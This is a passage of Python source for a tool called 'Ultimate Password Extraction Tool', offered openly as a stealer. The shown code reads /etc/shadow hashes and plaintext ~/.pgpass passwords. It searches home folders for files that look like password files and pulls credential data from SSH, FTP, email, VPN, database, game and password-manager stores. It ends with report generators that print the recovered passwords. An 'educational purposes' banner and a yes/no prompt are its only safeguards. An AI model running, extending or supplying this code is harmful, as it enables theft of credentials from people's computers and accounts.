                                user_idx = headers.index('"Run As User"')
                                if user_idx < len(parts) and parts[user_idx]:
                                    username = parts[user_idx].strip('"')
                                    if username and 'SYSTEM' not in username and 'LOCAL SERVICE' not in username:
                                        task_name_idx = headers.index('"TaskName"')
                                        task_name = parts[task_name_idx].strip('"')
                                        
                                        self.extracted_data["system_credentials"].append({
                                            'type': 'Scheduled Task',
                                            'target': task_name,
                                            'username': username,
                                            'password': '[Task Scheduler]',
                                            'source': 'Scheduled Tasks'
                                        })
            except:
                pass
            
            # 4. IIS Application Pool credentials
            try:
                import winreg
                key_path = r"SYSTEM\CurrentControlSet\Services\WAS\Parameters"
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey_path = f"{key_path}\\{subkey_name}"
                            
                            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path) as subkey:
                                try:
                                    identity_type, _ = winreg.QueryValueEx(subkey, "IdentityType")
                                    if identity_type == 3:  # Specific user
                                        username, _ = winreg.QueryValueEx(subkey, "WAMUser")
                                        self.extracted_data["system_credentials"].append({
                                            'type': 'IIS Application Pool',
                                            'target': subkey_name,
                                            'username': username,
                                            'password': '[Encrypted in Registry]',
                                            'source': 'IIS Configuration'
                                        })
                                except:
                                    pass
                            i += 1
                        except OSError:
                            break
            except:
                pass
            
            # 5. SQL Server credentials from registry
            try:
                sql_key_paths = [
                    r"SOFTWARE\Microsoft\MSSQLServer",
                    r"SOFTWARE\Microsoft\Microsoft SQL Server",
                    r"SOFTWARE\Wow6432Node\Microsoft\MSSQLServer",
                    r"SOFTWARE\Wow6432Node\Microsoft\Microsoft SQL Server"
                ]
                
                for base_path in sql_key_paths:
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base_path) as key:
                            i = 0
                            while True:
                                try:
                                    subkey_name = winreg.EnumKey(key, i)
                                    if 'MSSQLServer' in subkey_name or 'SQLServer' in subkey_name:
                                        self.extracted_data["system_credentials"].append({
                                            'type': 'SQL Server',
                                            'target': subkey_name,
                                            'username': 'SA or configured user',
                                            'password': '[Registry/DPAPI]',
                                            'source': 'SQL Server Registry'
                                        })
                                    i += 1
                                except OSError:
                                    break
                    except:
                        continue
            except:
                pass
            
        except Exception as e:
            print(f"    {Fore.RED}✗ Windows credential extraction error: {str(e)[:50]}")
    
    def _extract_unix_credentials(self):
        """Extract Unix/Linux credentials"""
        try:
            # 1. Check for /etc/shadow (requires root)
            if os.path.exists('/etc/shadow'):
                try:
                    with open('/etc/shadow', 'r') as f:
                        for line in f:
                            if ':' in line:
                                parts = line.strip().split(':')
                                if len(parts) >= 2 and parts[1] not in ['*', '!', '!!']:
                                    self.extracted_data["system_credentials"].append({
                                        'type': 'System User',
                                        'target': parts[0],
                                        'username': parts[0],
                                        'password': parts[1],
                                        'source': '/etc/shadow'
                                    })
                except:
                    pass
            
            # 2. SSH authorized keys
            ssh_dir = os.path.expanduser('~/.ssh')
            if os.path.exists(ssh_dir):
                auth_keys = os.path.join(ssh_dir, 'authorized_keys')
                if os.path.exists(auth_keys):
                    with open(auth_keys, 'r') as f:
                        for line in f:
                            if line.strip() and not line.startswith('#'):
                                self.extracted_data["system_credentials"].append({
                                    'type': 'SSH Key',
                                    'target': 'SSH Access',
                                    'username': 'Public Key',
                                    'password': line.strip()[:50] + '...',
                                    'source': 'SSH authorized_keys'
                                })
            
            # 3. Password files in home directory
            home = os.path.expanduser('~')
            password_patterns = ['*pass*', '*cred*', '*pwd*', '*secret*']
            
            for pattern in password_patterns:
                try:
                    import glob
                    for file in glob.glob(os.path.join(home, pattern)):
                        if os.path.isfile(file):
                            try:
                                with open(file, 'r', errors='ignore') as f:
                                    content = f.read(500)
                                    # Look for password-like content
                                    if any(keyword in content.lower() for keyword in ['password', 'pass', 'pwd', 'secret']):
                                        self.extracted_data["system_credentials"].append({
                                            'type': 'Password File',
                                            'target': os.path.basename(file),
                                            'username': 'File content',
                                            'password': content[:100] + '...',
                                            'source': f'File: {file}'
                                        })
                            except:
                                pass
                except:
                    pass
            
        except Exception as e:
            print(f"    {Fore.RED}✗ Unix credential extraction error: {str(e)[:50]}")
    
    def _extract_email_clients(self):
        """Extract email client configurations"""
        try:
            # Outlook (Windows)
            if platform.system() == "Windows":
                try:
                    import winreg
                    # Outlook profiles
                    key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles"
                    try:
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                            i = 0
                            while True:
                                try:
                                    profile_name = winreg.EnumKey(key, i)
                                    profile_path = f"{key_path}\\{profile_name}"
                                    
                                    # Try to get email accounts
                                    try:
                                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, f"{profile_path}\\9375CFF0413111d3B88A00104B2A6676") as account_key:
                                            try:
                                                email, _ = winreg.QueryValueEx(account_key, "Email")
                                                self.extracted_data["email_clients"].append({
                                                    'client': 'Outlook',
                                                    'profile': profile_name,
                                                    'email': email,
                                                    'password': '[Encrypted in Registry]',
                                                    'server': 'Exchange/Outlook',
                                                    'source': 'Windows Registry'
                                                })
                                            except:
                                                pass
                                    except:
                                        pass
                                    
                                    i += 1
                                except OSError:
                                    break
                    except:
                        pass
                except:
                    pass
            
            # Thunderbird (cross-platform)
            thunderbird_paths = []
            if platform.system() == "Windows":
                thunderbird_paths.append(os.path.join(os.environ['APPDATA'], 'Thunderbird', 'Profiles'))
            elif platform.system() == "Darwin":
                thunderbird_paths.append(os.path.join(os.path.expanduser('~'), 'Library', 'Thunderbird', 'Profiles'))
            else:
                thunderbird_paths.append(os.path.join(os.path.expanduser('~'), '.thunderbird'))
            
            for tb_path in thunderbird_paths:
                if os.path.exists(tb_path):
                    for profile in os.listdir(tb_path):
                        profile_path = os.path.join(tb_path, profile)
                        if os.path.isdir(profile_path):
                            # Check for prefs.js
                            prefs_file = os.path.join(profile_path, 'prefs.js')
                            if os.path.exists(prefs_file):
                                try:
                                    with open(prefs_file, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                    
                                    # Extract email addresses
                                    email_matches = re.findall(r'mail\.identity\.\w+\.useremail", "([^"]+)"', content)
                                    for email in email_matches:
                                        self.extracted_data["email_clients"].append({
                                            'client': 'Thunderbird',
                                            'profile': profile,
                                            'email': email,
                                            'password': '[Encrypted in profile]',
                                            'server': 'IMAP/SMTP',
                                            'source': 'Thunderbird prefs.js'
                                        })
                                except:
                                    pass
            
        except Exception as e:
            print(f"    {Fore.RED}✗ Email client extraction error: {str(e)[:50]}")
    
    def _extract_ftp_ssh_clients(self):
        """Extract FTP and SSH client configurations"""
        try:
            # FileZilla (cross-platform)
            filezilla_paths = []
            if platform.system() == "Windows":
                filezilla_paths.append(os.path.join(os.environ['APPDATA'], 'FileZilla'))
            elif platform.system() == "Darwin":
                filezilla_paths.append(os.path.join(os.path.expanduser('~'), 'Library', 'Preferences', 'FileZilla'))
            else:
                filezilla_paths.append(os.path.join(os.path.expanduser('~'), '.filezilla'))
            
            for fz_path in filezilla_paths:
                if os.path.exists(fz_path):
                    # Check for sitemanager.xml
                    site_file = os.path.join(fz_path, 'sitemanager.xml')
                    if os.path.exists(site_file):
                        try:
                            with open(site_file, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                            
                            # Parse FTP sites (simplified)
                            server_matches = re.findall(r'<Host>([^<]+)</Host>', content)
                            user_matches = re.findall(r'<User>([^<]+)</User>', content)
                            
                            for i, (server, user) in enumerate(zip(server_matches, user_matches)):
                                self.extracted_data["ftp_clients"].append({
                                    'client': 'FileZilla',
                                    'server': server,
                                    'username': user,
                                    'password': '[Encrypted in XML]',
                                    'port': '21',
                                    'source': 'FileZilla sitemanager.xml'
                                })
                        except:
                            pass
            
            # WinSCP (Windows)
            if platform.system() == "Windows":
                try:
                    import winreg
                    winscp_key = r"Software\Martin Prikryl\WinSCP 2\Sessions"
                    try:
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, winscp_key) as key:
                            i = 0
                            while True:
                                try:
                                    session_name = winreg.EnumKey(key, i)
                                    session_path = f"{winscp_key}\\{session_name}"
                                    
                                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, session_path) as session_key:
                                        try:
                                            hostname, _ = winreg.QueryValueEx(session_key, "HostName")
                                            username, _ = winreg.QueryValueEx(session_key, "UserName")
                                            
                                            self.extracted_data["ftp_clients"].append({
                                                'client': 'WinSCP',
                                                'server': hostname,
                                                'username': username,
                                                'password': '[Encrypted in Registry]',
                                                'port': '22/21',
                                                'source': 'WinSCP Registry'
                                            })
                                        except:
                                            pass
                                    
                                    i += 1
                                except OSError:
                                    break
                    except:
                        pass
                except:
                    pass
            
            # SSH config files
            ssh_config = os.path.expanduser('~/.ssh/config')
            if os.path.exists(ssh_config):
                try:
                    with open(ssh_config, 'r') as f:
                        content = f.read()
                    
                    # Parse SSH config (simplified)
                    host_blocks = re.split(r'Host\s+', content)[1:]
                    for block in host_blocks:
                        lines = block.strip().split('\n')
                        host = lines[0].strip()
                        hostname = user = ''
                        
                        for line in lines[1:]:
                            if line.strip().startswith('HostName'):
                                hostname = line.split()[1]
                            elif line.strip().startswith('User'):
                                user = line.split()[1]
                        
                        if hostname and user:
                            self.extracted_data["ssh_keys"].append({
                                'client': 'OpenSSH',
                                'host': host,
                                'hostname': hostname,
                                'username': user,
                                'key_file': '~/.ssh/id_rsa or config',
                                'source': 'SSH config'
                            })
                except:
                    pass
            
        except Exception as e:
            print(f"    {Fore.RED}✗ FTP/SSH client extraction error: {str(e)[:50]}")
    
    def _extract_database_clients(self):
        """Extract database client configurations"""
        try:
            # MySQL my.cnf files
            mysql_paths = [
                os.path.expanduser('~/.my.cnf'),
                '/etc/my.cnf',
                '/etc/mysql/my.cnf'
            ]
            
            for mysql_file in mysql_paths:
                if os.path.exists(mysql_file):
                    try:
                        with open(mysql_file, 'r') as f:
                            content = f.read()
                        
                        # Parse for credentials (simplified)
                        if 'user=' in content or 'password=' in content:
                            self.extracted_data["database_clients"].append({
                                'client': 'MySQL',
                                'config_file': mysql_file,
                                'username': 'Found in config',
                                'password': '[Plaintext in config]',
                                'source': 'MySQL config file'
                            })
                    except:
                        pass
            
            # PostgreSQL .pgpass
            pgpass_file = os.path.expanduser('~/.pgpass')
            if os.path.exists(pgpass_file):
                try:
                    with open(pgpass_file, 'r') as f:
                        lines = f.readlines()
                    
                    for line in lines:
                        if line.strip() and not line.startswith('#'):
                            parts = line.strip().split(':')
                            if len(parts) >= 5:
                                self.extracted_data["database_clients"].append({
                                    'client': 'PostgreSQL',
                                    'host': parts[0],
                                    'port': parts[1],
                                    'database': parts[2],
                                    'username': parts[3],
                                    'password': parts[4],
                                    'source': '.pgpass file'
                                })
                except:
                    pass
            
            # SQLite databases in common locations
            common_dirs = [
                os.path.expanduser('~'),
                os.path.expanduser('~/Desktop'),
                os.path.expanduser('~/Documents'),
                os.path.expanduser('~/Downloads')
            ]
            
            for directory in common_dirs:
                if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory, topdown=True):
                        # Limit depth
                        if root.count(os.sep) - directory.count(os.sep) > 2:
                            continue
                        
                        for file in files:
                            if file.endswith('.db') or file.endswith('.sqlite') or file.endswith('.sqlite3'):
                                db_path = os.path.join(root, file)
                                self.extracted_data["database_clients"].append({
                                    'client': 'SQLite',
                                    'database_file': db_path,
                                    'username': 'N/A (file-based)',
                                    'password': '[No password or file-based]',
                                    'source': 'SQLite database file'
                                })
                        
        except Exception as e:
            print(f"    {Fore.RED}✗ Database client extraction error: {str(e)[:50]}")
    
    def _extract_vpn_configs(self):
        """Extract VPN configurations"""
        try:
            # OpenVPN configs
            openvpn_paths = []
            if platform.system() == "Windows":
                openvpn_paths.append(os.path.join(os.environ['USERPROFILE'], 'OpenVPN', 'config'))
                openvpn_paths.append(os.path.join(os.environ['PROGRAMFILES'], 'OpenVPN', 'config'))
            elif platform.system() == "Darwin":
                openvpn_paths.append('/etc/openvpn')
                openvpn_paths.append(os.path.expanduser('~/Library/Application Support/OpenVPN'))
            else:
                openvpn_paths.append('/etc/openvpn')
                openvpn_paths.append(os.path.expanduser('~/.openvpn'))
            
            for ovpn_path in openvpn_paths:
                if os.path.exists(ovpn_path):
                    for file in os.listdir(ovpn_path):
                        if file.endswith('.ovpn') or file.endswith('.conf'):
                            config_file = os.path.join(ovpn_path, file)
                            try:
                                with open(config_file, 'r', errors='ignore') as f:
                                    content = f.read(1000)
                                
                                # Check for auth-user-pass
                                if 'auth-user-pass' in content:
                                    self.extracted_data["vpn_configs"].append({
                                        'client': 'OpenVPN',
                                        'config_file': config_file,
                                        'username': '[In separate file]',
                                        'password': '[In separate file]',
                                        'source': 'OpenVPN config'
                                    })
                            except:
                                pass
            
            # Windows VPN connections
            if platform.system() == "Windows":
                try:
                    import winreg
                    vpn_key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, vpn_key) as key:
                            i = 0
                            while True:
                                try:
                                    profile_name = winreg.EnumKey(key, i)
                                    profile_path = f"{vpn_key}\\{profile_name}"
                                    
                                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, profile_path) as profile_key:
                                        try:
                                            name, _ = winreg.QueryValueEx(profile_key, "ProfileName")
                                            if 'VPN' in name.upper() or 'VIRTUAL' in name.upper():
                                                self.extracted_data["vpn_configs"].append({
                                                    'client': 'Windows VPN',
                                                    'connection_name': name,
                                                    'username': '[Windows Credential Manager]',
                                                    'password': '[Windows Credential Manager]',
                                                    'source': 'Windows Network Profiles'
                                                })
                                        except:
                                            pass
                                    
                                    i += 1
                                except OSError:
                                    break
                    except:
                        pass
                except:
                    pass
            
        except Exception as e:
            print(f"    {Fore.RED}✗ VPN config extraction error: {str(e)[:50]}")
    
    def _extract_game_credentials(self):
        """Extract game client credentials"""
        try:
            # Steam
            if platform.system() == "Windows":
                steam_path = os.path.join(os.environ['PROGRAMFILES(X86)'], 'Steam')
                if os.path.exists(steam_path):
                    # Check for config files
                    config_files = ['config.vdf', 'loginusers.vdf']
                    for config_file in config_files:
                        file_path = os.path.join(steam_path, 'config', config_file)
                        if os.path.exists(file_path):
                            self.extracted_data["game_credentials"].append({
                                'client': 'Steam',
                                'config_file': config_file,
                                'username': '[In config file]',
                                'password': '[Encrypted]',
                                'source': 'Steam config'
                            })
            
            # Minecraft
            minecraft_path = os.path.join(os.path.expanduser('~'), '.minecraft')
            if os.path.exists(minecraft_path):
                # Check for launcher profiles
                profiles_file = os.path.join(minecraft_path, 'launcher_profiles.json')
                if os.path.exists(profiles_file):
                    try:
                        with open(profiles_file, 'r') as f:
                            profiles = json.load(f)
                        
                        if 'authenticationDatabase' in profiles:
                            self.extracted_data["game_credentials"].append({
                                'client': 'Minecraft',
                                'profiles': 'Multiple',
                                'username': '[In profiles file]',
                                'password': '[Encrypted tokens]',
                                'source': 'Minecraft launcher_profiles.json'
                            })
                    except:
                        pass
            
            # Epic Games Launcher
            if platform.system() == "Windows":
                epic_path = os.path.join(os.environ['LOCALAPPDATA'], 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
                if os.path.exists(epic_path):
                    self.extracted_data["game_credentials"].append({
                        'client': 'Epic Games',
                        'config_dir': epic_path,
                        'username': '[In config]',
                        'password': '[Encrypted]',
                        'source': 'Epic Games config'
                    })
            
            # Ubisoft Connect
            if platform.system() == "Windows":
                ubisoft_path = os.path.join(os.environ['LOCALAPPDATA'], 'Ubisoft Game Launcher')
                if os.path.exists(ubisoft_path):
                    self.extracted_data["game_credentials"].append({
                        'client': 'Ubisoft Connect',
                        'config_dir': ubisoft_path,
                        'username': '[In config]',
                        'password': '[Encrypted]',
                        'source': 'Ubisoft config'
                    })
            
        except Exception as e:
            print(f"    {Fore.RED}✗ Game credential extraction error: {str(e)[:50]}")
    
    def _extract_application_passwords(self):
        """Extract passwords from various applications"""
        try:
            # Password managers
            password_managers = {
                'KeePass': self._check_keepass,
                'LastPass': self._check_lastpass,
                'Bitwarden': self._check_bitwarden,
                '1Password': self._check_1password,
                'Dashlane': self._check_dashlane
            }
            
            for manager_name, check_func in password_managers.items():
                try:
                    result = check_func()
                    if result:
                        self.extracted_data["application_passwords"].extend(result)
                except:
                    pass
            
            # Office documents with passwords
            self._check_office_documents()
            
            # ZIP/RAR archives with passwords
            self._check_archives()
            
            # PDF files with passwords
            self._check_pdf_files()
            
        except Exception as e:
            print(f"    {Fore.RED}✗ Application password extraction error: {str(e)[:50]}")
    
    def _check_keepass(self):
        """Check for KeePass password databases"""
        results = []
        
        # Common KeePass database locations
        kdbx_locations = [
            os.path.expanduser('~/Documents'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~'),
            os.path.expanduser('~/Downloads')
        ]
        
        if platform.system() == "Windows":
            kdbx_locations.extend([
                os.path.join(os.environ['USERPROFILE'], 'Documents'),
                os.path.join(os.environ['USERPROFILE'], 'Desktop'),
                os.path.join(os.environ['USERPROFILE'], 'Downloads')
            ])
        
        for location in kdbx_locations:
            if os.path.exists(location):
                for root, dirs, files in os.walk(location, topdown=True):
                    # Limit depth
                    if root.count(os.sep) - location.count(os.sep) > 2:
                        continue
                    
                    for file in files:
                        if file.endswith('.kdbx') or file.endswith('.kdb'):
                            db_path = os.path.join(root, file)
                            results.append({
                                'application': 'KeePass',
                                'type': 'Password Database',
                                'file': db_path,
                                'password': '[Master password required]',
                                'source': 'KeePass database file'
                            })
        
        return results
    
    def _check_lastpass(self):
        """Check for LastPass data"""
        results = []
        
        if platform.system() == "Windows":
            # LastPass extension data
            chrome_ext_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'hdokiejnpimakedhajhdlcegeplioahd')
            if os.path.exists(chrome_ext_path):
                results.append({
                    'application': 'LastPass',
                    'type': 'Browser Extension',
                    'location': chrome_ext_path,
                    'password': '[Encrypted extension data]',
                    'source': 'Chrome LastPass extension'
                })
        
        return results
    
    def _check_bitwarden(self):
        """Check for Bitwarden data"""
        results = []
        
        if platform.system() == "Windows":
            # Bitwarden data directory
            bw_path = os.path.join(os.environ['APPDATA'], 'Bitwarden')
            if os.path.exists(bw_path):
                results.append({
                    'application': 'Bitwarden',
                    'type': 'Password Manager',
                    'location': bw_path,
                    'password': '[Encrypted local data]',
                    'source': 'Bitwarden app data'
                })
        
        return results
    
    def _check_1password(self):
        """Check for 1Password data"""
        results = []
        
        if platform.system() == "Windows":
            op_path = os.path.join(os.environ['LOCALAPPDATA'], '1Password', 'data')
            if os.path.exists(op_path):
                results.append({
                    'application': '1Password',
                    'type': 'Password Manager',
                    'location': op_path,
                    'password': '[Encrypted with master password]',
                    'source': '1Password data directory'
                })
        
        return results
    
    def _check_dashlane(self):
        """Check for Dashlane data"""
        results = []
        
        if platform.system() == "Windows":
            dashlane_path = os.path.join(os.environ['LOCALAPPDATA'], 'Dashlane')
            if os.path.exists(dashlane_path):
                results.append({
                    'application': 'Dashlane',
                    'type': 'Password Manager',
                    'location': dashlane_path,
                    'password': '[Encrypted local data]',
                    'source': 'Dashlane app data'
                })
        
        return results
    
    def _check_office_documents(self):
        """Check for password-protected Office documents"""
        results = []
        
        # Common document locations
        doc_locations = [
            os.path.expanduser('~/Documents'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Downloads')
        ]
        
        if platform.system() == "Windows":
            doc_locations.extend([
                os.path.join(os.environ['USERPROFILE'], 'Documents'),
                os.path.join(os.environ['USERPROFILE'], 'Desktop'),
                os.path.join(os.environ['USERPROFILE'], 'Downloads')
            ])
        
        office_extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf']
        
        for location in doc_locations:
            if os.path.exists(location):
                for root, dirs, files in os.walk(location, topdown=True):
                    # Limit depth
                    if root.count(os.sep) - location.count(os.sep) > 2:
                        continue
                    
                    for file in files:
                        if any(file.endswith(ext) for ext in office_extensions):
                            # In a real implementation, you would try to open
                            # and check if password is required
                            file_path = os.path.join(root, file)
                            
                            # Check file size (password protected files often have specific headers)
                            try:
                                with open(file_path, 'rb') as f:
                                    header = f.read(100)
                                    
                                    # Check for Office file signatures and encryption flags
                                    if b'Encrypted' in header or b'password' in header.lower():
                                        results.append({
                                            'application': 'Microsoft Office',
                                            'type': 'Password Protected Document',
                                            'file': file_path,
                                            'password': '[Document password]',
                                            'source': 'Office document'
                                        })
                            except:
                                pass
        
        if results:
            self.extracted_data["application_passwords"].extend(results)
    
    def _check_archives(self):
        """Check for password-protected archives"""
        # Similar pattern as office documents
        pass
    
    def _check_pdf_files(self):
        """Check for password-protected PDF files"""
        # Similar pattern as office documents
        pass

# ============================================================================
# ADVANCED REPORTING ENGINE
# ============================================================================

class AdvancedReportGenerator:
    """Generate comprehensive reports with visualizations"""
    
    def __init__(self):
        self.report_data = {}
        self.stats = {}
    
    def generate_report(self, extracted_data: Dict, output_format: str = "html") -> str:
        """Generate comprehensive report in specified format"""
        self.report_data = extracted_data
        self._calculate_statistics()
        
        if output_format.lower() == "html":
            return self._generate_html_report()
        elif output_format.lower() == "csv":
            return self._generate_csv_reports()
        elif output_format.lower() == "console":
            return self._generate_console_report()
        else:
            return self._generate_html_report()
    
    def _calculate_statistics(self):
        """Calculate comprehensive statistics"""
        self.stats = {
            "total_passwords": len(self.report_data.get("browser_passwords", [])),
            "decrypted_passwords": len([p for p in self.report_data.get("browser_passwords", []) 
                                      if p.get('encryption_status') == 'Decrypted']),
            "encrypted_passwords": len([p for p in self.report_data.get("browser_passwords", []) 
                                      if p.get('encryption_status') == 'Encrypted']),
            "wifi_networks": len(self.report_data.get("wifi_passwords", [])),
            "system_credentials": len(self.report_data.get("system_credentials", [])),
            "email_accounts": len(self.report_data.get("email_clients", [])),
            "ftp_connections": len(self.report_data.get("ftp_clients", [])),
            "database_connections": len(self.report_data.get("database_clients", [])),
            "vpn_configs": len(self.report_data.get("vpn_configs", [])),
            "game_accounts": len(self.report_data.get("game_credentials", [])),
            "application_passwords": len(self.report_data.get("application_passwords", [])),
            "browsers_found": set(p['browser'] for p in self.report_data.get("browser_passwords", [])),
            "unique_domains": set(p['url'].split('/')[2] if '//' in p['url'] else p['url'] 
                                for p in self.report_data.get("browser_passwords", []) if p['url'])
        }
    
    def _generate_html_report(self) -> str:
        """Generate comprehensive HTML report"""
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join(downloads_path, f'Ultimate_Password_Report_{timestamp}.html')
        
        # Generate HTML content
        html = self._create_html_template()
        
        # Write to file
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html)
        
        return report_path
    
    def _create_html_template(self) -> str:
        """Create HTML report template"""
        # This is a simplified version - actual implementation would be much more detailed
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Ultimate Password Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background: #333; color: white; padding: 20px; }}
                .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; }}
                .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }}
                .stat-card {{ background: #f5f5f5; padding: 15px; border-radius: 5px; }}
                table {{ width: 100%; border-collapse: collapse; }}
                th, td {{ padding: 10px; border: 1px solid #ddd; text-align: left; }}
                th {{ background: #f0f0f0; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Ultimate Password Extraction Report</h1>
                <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>User: {getpass.getuser()}</p>
            </div>
            
            <div class="section">
                <h2>Statistics Summary</h2>
                <div class="stats">
                    <div class="stat-card">
                        <h3>Browser Passwords</h3>
                        <p>Total: {self.stats['total_passwords']}</p>
                        <p>Decrypted: {self.stats['decrypted_passwords']}</p>
                        <p>Encrypted: {self.stats['encrypted_passwords']}</p>
                    </div>
                    <div class="stat-card">
                        <h3>WiFi Networks</h3>
                        <p>Found: {self.stats['wifi_networks']}</p>
                    </div>
                    <div class="stat-card">
                        <h3>System Credentials</h3>
                        <p>Found: {self.stats['system_credentials']}</p>
                    </div>
                </div>
            </div>
            
            <!-- Add more sections for each data type -->
        </body>
        </html>
        """
        return html
    
    def _generate_csv_reports(self) -> str:
        """Generate CSV reports for each data type"""
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_path = os.path.join(downloads_path, f'Password_Reports_{timestamp}')
        
        # Create directory for CSV files
        os.makedirs(base_path, exist_ok=True)
        
        # Generate CSV for each data type
        for data_type, data_list in self.report_data.items():
            if data_list:
                csv_path = os.path.join(base_path, f'{data_type}.csv')
                self._write_csv(data_list, csv_path)
        
        return base_path
    
    def _write_csv(self, data: List[Dict], filepath: str):
        """Write data to CSV file"""
        if not data:
            return
        
        with open(filepath, 'w', newline='', encoding='utf-8') as csvfile:
            # Get all possible keys
            all_keys = set()
            for item in data:
                all_keys.update(item.keys())
            
            writer = csv.DictWriter(csvfile, fieldnames=list(all_keys))
            writer.writeheader()
            writer.writerows(data)
    
    def _generate_console_report(self) -> str:
        """Generate console-based report"""
        report_lines = []
        
        report_lines.append("=" * 80)
        report_lines.append("ULTIMATE PASSWORD EXTRACTION REPORT")
        report_lines.append("=" * 80)
        report_lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report_lines.append(f"User: {getpass.getuser()}")
        report_lines.append(f"System: {platform.system()} {platform.release()}")
        report_lines.append("=" * 80)
        
        # Statistics
        report_lines.append("\n📊 STATISTICS:")
        report_lines.append("-" * 40)
        report_lines.append(f"Browser Passwords: {self.stats['total_passwords']}")
        report_lines.append(f"  → Decrypted: {self.stats['decrypted_passwords']}")
        report_lines.append(f"  → Encrypted: {self.stats['encrypted_passwords']}")
        report_lines.append(f"WiFi Networks: {self.stats['wifi_networks']}")
        report_lines.append(f"System Credentials: {self.stats['system_credentials']}")
        report_lines.append(f"Email Accounts: {self.stats['email_accounts']}")
        report_lines.append(f"FTP/SSH Connections: {self.stats['ftp_connections']}")
        report_lines.append(f"Database Connections: {self.stats['database_connections']}")
        
        # Browser details
        if self.report_data.get("browser_passwords"):
            report_lines.append("\n🌐 BROWSER PASSWORDS:")
            report_lines.append("-" * 40)
            
            # Group by browser
            by_browser = {}
            for pwd in self.report_data["browser_passwords"]:
                browser = pwd.get('browser', 'Unknown')
                if browser not in by_browser:
                    by_browser[browser] = []
                by_browser[browser].append(pwd)
            
            for browser, passwords in by_browser.items():
                decrypted = len([p for p in passwords if p.get('encryption_status') == 'Decrypted'])
                report_lines.append(f"{browser}: {len(passwords)} passwords ({decrypted} decrypted)")
                
                # Show top 3 sites
                for i, pwd in enumerate(passwords[:3]):
                    url_display = pwd.get('url', '')[:50] + ('...' if len(pwd.get('url', '')) > 50 else '')
                    password_display = pwd.get('password', '')[:20] + ('...' if len(pwd.get('password', '')) > 20 else '')
                    report_lines.append(f"  {i+1}. {url_display}")
                    report_lines.append(f"     User: {pwd.get('username', '')}")
                    report_lines.append(f"     Pass: {password_display}")
        
        # WiFi passwords
        if self.report_data.get("wifi_passwords"):
            report_lines.append("\n📶 WIFI NETWORKS:")
            report_lines.append("-" * 40)
            for wifi in self.report_data["wifi_passwords"][:5]:
                report_lines.append(f"SSID: {wifi.get('ssid', '')}")
                report_lines.append(f"Password: {wifi.get('password', '')}")
                report_lines.append(f"Security: {wifi.get('security', '')}")
                report_lines.append("")
        
        return "\n".join(report_lines)

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def print_banner():
    """Print tool banner"""
    banner = f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║                ULTIMATE PASSWORD EXTRACTION TOOL v3.0                    ║
║                                                                          ║
║                   {Fore.RED}⚠ FOR EDUCATIONAL PURPOSES ONLY ⚠{Fore.GREEN}                    ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
{Fore.CYAN}Author: Sabari425 Security Team
{Fore.CYAN}Description: Comprehensive password extraction from browsers, WiFi, 
{Fore.CYAN}            system credentials, and applications with decryption
{Fore.YELLOW}Platform: {platform.system()} {platform.release()}
{Fore.YELLOW}User: {getpass.getuser()}
{Fore.YELLOW}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Style.RESET_ALL}
"""
    print(banner)

def get_user_confirmation():
    """Get user confirmation before proceeding"""
    print(f"{Fore.RED}{Style.BRIGHT}⚠ WARNING: This tool extracts sensitive information.")
    print(f"{Fore.RED}Use only on systems you own or have explicit permission to test.")
    print(f"{Fore.RED}You are responsible for proper use of this tool.")
    print()
    
    response = input(f"{Fore.YELLOW}Do you understand and accept responsibility? (yes/no): {Style.RESET_ALL}")
    return response.lower() in ['yes', 'y', 'ok']

def main():
    """Main execution function"""
    try:
        # Print banner
        print_banner()
        
        # Get confirmation
        if not get_user_confirmation():
            print(f"{Fore.RED}Operation cancelled by user.{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}[*] Starting comprehensive password extraction...{Style.RESET_ALL}")
        
        # Initialize extractor
        extractor = ComprehensivePasswordExtractor()
        
        # Extract all passwords
        extracted_data = extractor.extract_all_passwords()
        
        # Get decryption statistics
        decryption_stats = extractor.decryption_engine.get_stats()
        
        # Generate reports
        print(f"\n{Fore.GREEN}[*] Generating reports...{Style.RESET_ALL}")
        reporter = AdvancedReportGenerator()
        
